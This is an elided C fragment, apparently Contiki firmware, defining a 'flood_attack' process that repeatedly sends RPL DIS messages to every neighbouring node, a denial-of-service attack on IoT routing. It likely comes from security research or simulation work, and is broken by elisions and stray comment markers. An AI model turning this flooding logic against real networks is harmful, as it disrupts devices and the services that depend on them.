...
#define FLOOD_INTERVAL    (120 * CLOCK_SECOND)/*
...
PROCESS(flood_attack, "flooding  attack");
...
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(flood_attack, ev, data){

static struct etimer timer;
  static int dis_sent_flood = 0;
  PROCESS_BEGIN();
  ...
  while(1) {
    ...
    for(nbr_l = uip_ds6_nbr_head(); nbr_l != NULL; nbr_l = uip_ds6_nbr_next(nbr_l)) {
      ...
      dis_output(&nbr_l->ipaddr);/*
	  char buf[21];
	  uiplib_ipaddr_snprint(buf, sizeof(buf), &nbr_l->ipaddr);
		printf("sending DIS to %s\n",buf);*/
		    ++dis_sent_flood;
